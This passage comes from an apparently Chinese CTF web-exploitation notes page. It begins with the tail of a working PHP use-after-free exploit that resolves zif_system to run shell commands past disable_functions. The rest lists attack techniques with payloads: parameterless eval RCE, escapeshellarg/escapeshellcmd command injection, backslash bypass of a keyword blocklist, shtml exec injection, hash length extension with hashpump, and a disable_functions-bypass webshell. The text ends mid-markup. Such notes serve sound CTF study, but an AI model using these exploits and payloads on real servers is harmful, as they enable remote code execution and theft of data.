class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h1 id="XFF头伪造IP"><a href="#XFF头伪造IP" class="headerlink" title="XFF头伪造IP:"></a>XFF头伪造IP:</h1><p><img src="/images/ctfweb-others/image-20221018174027035.png" alt="image-20221018174027035"></p><p>例如: 某网页能够返回访问者的真实IP:</p><img src="/images/ctfweb-others/image-20221018174153565.png" alt="image-20221018174153565" style="zoom:67%;" /><p>加上<code>XFF</code>头之后:</p><p><img src="/images/ctfweb-others/image-20221018174101573.png" alt="image-20221018174101573"></p><h1 id="escapeshellarg和escapeshellcmd的共用漏洞"><a href="#escapeshellarg和escapeshellcmd的共用漏洞" class="headerlink" title="escapeshellarg和escapeshellcmd的共用漏洞"></a>escapeshellarg和escapeshellcmd的共用漏洞</h1><p><code>escapeshellarg</code>和<code>escapeshellcmd</code>会对传入字符串中的特殊字符进行转义,以保证传入<code>shell</code>的参数字符串是安全的</p><p>其中<code>escapeshellarg</code>会在未配对的单引号前面加上<code>\</code>,然后再在转义后的<code>\&#39;</code>两段再加上一对单引号,最后再在整个字符串的两端加上一对单引号</p><p><code>escapeshellcmd</code>会在下列特殊字符(包括<code>/</code>)以及不成对的单引号前面加上<code>\</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：`&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\`、`\x0A` 和 `\xFF`。</span><br></pre></td></tr></table></figure><p>简单的示例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;abc&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$d</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*输出:</span></span><br><span class="line"><span class="comment">1.无处理的输出:</span></span><br><span class="line"><span class="comment">abc&#x27;</span></span><br><span class="line"><span class="comment">2.下面这里从右到左第三个感叹号是原来字符串中的那个,先在其左边加上\,然后再将\&#x27;用一对单引号包裹,最后将整个字符串用一对单引号包裹</span></span><br><span class="line"><span class="comment">&#x27;abc&#x27;\&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="comment">3.下面这里只是在单引号左边加上了\</span></span><br><span class="line"><span class="comment">abc\&#x27;</span></span><br><span class="line"><span class="comment">4.下面这个在2的基础上,在\前面又加了\,同时在最后那个不成对的单引号前面也加了\</span></span><br><span class="line"><span class="comment">&#x27;abc&#x27;\\&#x27;&#x27;\&#x27;   </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>这两者单独使用都没有问题,而当对一个字符串先使用<code>escapeshellarg</code>在使用<code>escapeshellcmd</code>处理时,就会出现漏洞</p><p>先使用<code>escapeshellarg</code>能够将字符串整体用引号包裹起来,字符串避免被当作命令执行,但后面再执行<code>escapeshellcmd</code>,又会导致刚刚包裹字符串的引号失效,从而导致命令执行.</p><p>例题见: <a href="2e610037.html">[BUUCTF 2018]Online Tool</a></p><h1 id="无参数RCE常用函数和payload"><a href="#无参数RCE常用函数和payload" class="headerlink" title="无参数RCE常用函数和payload"></a>无参数RCE常用函数和payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">localeconv()  返回一包含本地数字及货币格式信息的**数组**，其中第一个元素是.</span><br><span class="line">current() 返回数组中的单元，默认是第一个，pos()与current()作用相同</span><br><span class="line">current(localeconv()): 返回.</span><br><span class="line"></span><br><span class="line">scandir() 扫描一个目录,以数组形式返回</span><br><span class="line">scandir(current(localeconv())) 扫描当前目录</span><br><span class="line">Print_r(scandir(current(localeconv()))) 打印当前目录下的内容</span><br><span class="line"></span><br><span class="line">getcwd() 获得当前目录的绝对路径</span><br><span class="line">Print_r(scandir(getcwd())) 扫描当前目录并输出</span><br><span class="line"></span><br><span class="line">dirname()返回上级目录的绝对路径</span><br><span class="line">Print_r(scandir(dirname(dirname(dirname(getcwd()))))) 可以依次增加dirname()直到找到根目录</span><br><span class="line">读取文件内容:</span><br><span class="line">show_source()</span><br><span class="line">file_get_content()</span><br><span class="line">highlight_file()</span><br><span class="line"></span><br><span class="line">数组操作:</span><br><span class="line">each() 返回当前键、值，并将指针向后移动一步</span><br><span class="line">end() 返回最后一个单元</span><br><span class="line">next() 下一个单元</span><br><span class="line">prev() 前一个单元</span><br><span class="line">array_reverse() 逆序返回数组</span><br></pre></td></tr></table></figure><p>另外,有些题目还可以通过字符拼接或者引入其他没受过滤限制的参数的方法来执行命令,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(end(current(get_defined_vars())))&amp;a=show_source(&#x27;/f1agg&#x27;);</span><br><span class="line">这里get_defined_vars()返回所有已定义变量所组成的数组,其中GET数组是其中的第一个元素</span><br><span class="line">上面最后其实就是eval($_GET[$a])</span><br></pre></td></tr></table></figure><p>具体应用见:<a href="2e610037.html">Easy Calc</a></p><br><p>利用<code>session_id</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先把要用eval执行的命令加密成16进制并放到Cookie中的 PHPSESSID字段里,然后:</span><br><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h1 id="preg-replace中e标签导致的命令执行"><a href="#preg-replace中e标签导致的命令执行" class="headerlink" title="preg_replace中e标签导致的命令执行"></a>preg_replace中e标签导致的命令执行</h1><p><strong><code>preg_replace</code>函数中, 使用了<code>/e</code>标签,意思是将完成替换后的字符串当作php代码来执行</strong></p><p>具体见<a href="2e610037.html">ZJCTF，不过如此</a></p><br><h1 id="file-get-contents函数-data-x2F-x2F-协议"><a href="#file-get-contents函数-data-x2F-x2F-协议" class="headerlink" title="file_get_contents函数_data:&#x2F;&#x2F;协议"></a>file_get_contents函数_data:&#x2F;&#x2F;协议</h1><p>遇到这种判断的,直接让<code>file_get_contents</code>从<code>data</code>协议里读数据就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=next.php&amp;text=data://text/plain,I have a dream</span><br></pre></td></tr></table></figure><br><h1 id="phpmyadmin漏洞利用"><a href="#phpmyadmin漏洞利用" class="headerlink" title="phpmyadmin漏洞利用"></a>phpmyadmin漏洞利用</h1><img src="/images/ctfweb-others/image-20221020094957901.png" alt="image-20221020094957901" style="zoom:67%;" /><p>各个版本的可利用漏洞: <a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0</a></p><p><a href="a458c677.html">phpmyadmin各版本漏洞利用</a></p><p><code>CVE-2018-12613：后台文件包含</code>漏洞利用:<a href="2e610037.html">[GWCTF 2019]我有一个数据库</a></p><br><h1 id="反斜杠-命令绕过过滤"><a href="#反斜杠-命令绕过过滤" class="headerlink" title="反斜杠+命令绕过过滤:"></a>反斜杠+命令绕过过滤:</h1><p>php中<code>preg_match</code>这里对反斜杠的过滤是有问题的</p><p>对反引号的检测无效，而在Linux中，反引号对一些命令也几乎没有影响</p><p>所以在常规命令里加一个反斜杠,一方面反斜杠无法被过滤,另一方面也导致命令也不会被过滤了:</p><img src="/images/ctfweb-others/image-20221020164005294.png" alt="image-20221020164005294" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=l\s+/   相当于执行了ls /   这里`+`是url中的连接符</span><br><span class="line">cmd=ca\t+/flag  </span><br></pre></td></tr></table></figure><img src="/images/ctfweb-others/image-20221020164200800.png" alt="image-20221020164200800" style="zoom:67%;" /><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里如果执行<code>ls</code>会被过滤,但是<code>l\s</code>可以正常执行</p><h1 id="intval的一些绕过"><a href="#intval的一些绕过" class="headerlink" title="intval的一些绕过"></a>intval的一些绕过</h1><p>这里<code>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</code> 可以利用运算时进行转换的性质</p><p>例如传<code>123e12</code>, <code>intval($num)</code>时,取到字母就会停止,所以是123</p><p>但是在进行运算时,会把它整体强制转换成数值,<strong>这里的<code>e</code>会被当成科学计数法</strong>,所以<code>intval($num + 1) &gt; 2021</code>也成立</p><br><hr><br><h1 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h1><blockquote><p>两个不同编码的<code>Unicode</code>字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，<strong>a 和ａ(\uff41)在某些字体下看起来可能相同</strong>，<strong>15和⑮(\u246e)其表示的数学意义可能相同</strong>，所以这两种字符都有其相应的等价性，这种等价性是由人为规定的。</p><p>转换组成字符的方式有 <code>Normalization Form C</code> 和 <code>Normalization Form KC</code> 两种，它们之间的区别取决于生成的文本是否与原始非标准化文本等效，其中<code>K</code>用于表示兼容性。同理，分解组成字符的方式也有<code>Normalization Form D </code>和<code>Normalization Form KD</code>两种。那么<code>NFC</code>和<code>NFD</code>的区别是什么呢，举例来说，<code>Å(\u212B)</code>用<code>NFD</code>进行<code>normalize</code>，会变为<code>Å(\u0041\u030a)</code>，而NFC处理后则是<code>Å(\u00c5)</code>。在normalize的时候，会检测字符是否在NFC表中，如果在则进行对应的转换算法。</p></blockquote><p>简单来说就是,很多字符,例如<code>A</code>,在<code>unicode</code>中都有特殊编码的等价字符,例如<code>ａ(\uff41)</code>. 这些等价字符常常可以用来绕过过滤和检测</p><p><a href="2e610037.html">[ASIS 2019]Unicorn shop</a></p><h1 id="构造反序列化POP链"><a href="#构造反序列化POP链" class="headerlink" title="构造反序列化POP链"></a>构造反序列化POP链</h1><p>注意如果有<code>a</code>,<code>b</code>是不同的两个类的实例, 且<code>b</code>是<code>a</code>的属性<code>x</code>的值</p><p>那么当涉及<code>a-&gt;x</code>时,要分清楚会调用<code>a</code>所在类的魔术方法,还是<code>b</code>所在类的魔术方法</p><p><a href="2e610037.html">[MRCTF2020]Ezpop</a></p><h1 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h1><p>这里还可以通过<code>hashpump</code>工具进行哈希长度扩展攻击: (<strong>安在kali中了</strong>)</p><blockquote><p>如果一个应用程序是这样操作的：</p><ol><li>准备了一个密文和一些数据构造成一个字符串，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature&#x2F;签名）</li><li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</li><li>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li></ol><p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出<code>&#123;secret || data || attacker_controlled_data&#125;</code>的哈希值<em>。</em></p></blockquote><p>例如本题中的密文就是<code>secret_key</code></p><p>目前掌握的的是<code>md5(secret_key+ &quot;flag.txtscan&quot;)</code>的值,那么我们可以通过工具获得<code>md5(secret_key+ flag.txtscan+read)</code>的值</p><p>这样如果再从<code>action</code>中传 <code>scanread</code> 就可以成功执行<code>read</code>功能了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali㉿kali)-[~/Desktop/HashPump]</span><br><span class="line">└─$ hashpump   </span><br><span class="line">Input Signature: d4bd0b631614327be0367efa305057e5</span><br><span class="line">Input Data: flag.txtscan  (本来追加在secret_key后面的已知数据)</span><br><span class="line">Input Key Length: 16  (secret_key的长度)</span><br><span class="line">Input Data to Add: read  (为了计算新的sign值,我们希望添加的新数据)</span><br><span class="line">aeccfcf28d2da89a3c8581a6c90d1842  (计算结果,新的sign值)</span><br><span class="line">flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read  (新的secret_key后面的已知数据)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="shtml文件执行系统命令"><a href="#shtml文件执行系统命令" class="headerlink" title="shtml文件执行系统命令"></a>shtml文件执行系统命令</h1><p><code>shtml</code>文件中写入如下格式就可以执行系统命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec Cmd=&quot;命令&quot;--&gt;</span><br><span class="line">例如:</span><br><span class="line">&lt;!--#exec Cmd=&quot;ls /&quot;--&gt;</span><br></pre></td></tr></table></figure><p>例题见: <a href="4f3ccb8a.html">[BJDCTF2020]EasySearch</a></p><hr><h1 id="绕过php的disable-functions"><a href="#绕过php的disable-functions" class="headerlink" title="绕过php的disable_functions"></a>绕过php的disable_functions</h1><p>本项目中有三个关键文件，<code>bypass_disablefunc.php</code>、<code>bypass_disablefunc_x64.so</code>、<code>bypass_disablefunc_x86.so</code>。</p><p><code>bypass_disablefunc.php</code> 为命令执行<code> webshell</code>，提供三个 GET 参数：</p><p>(将<code>bypass_disablefunc.php</code>、<code>bypass_disablefunc_x64.so</code>传到目标后,访问<code>bypass_disablefunc.php</code>并传参来执行命令)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 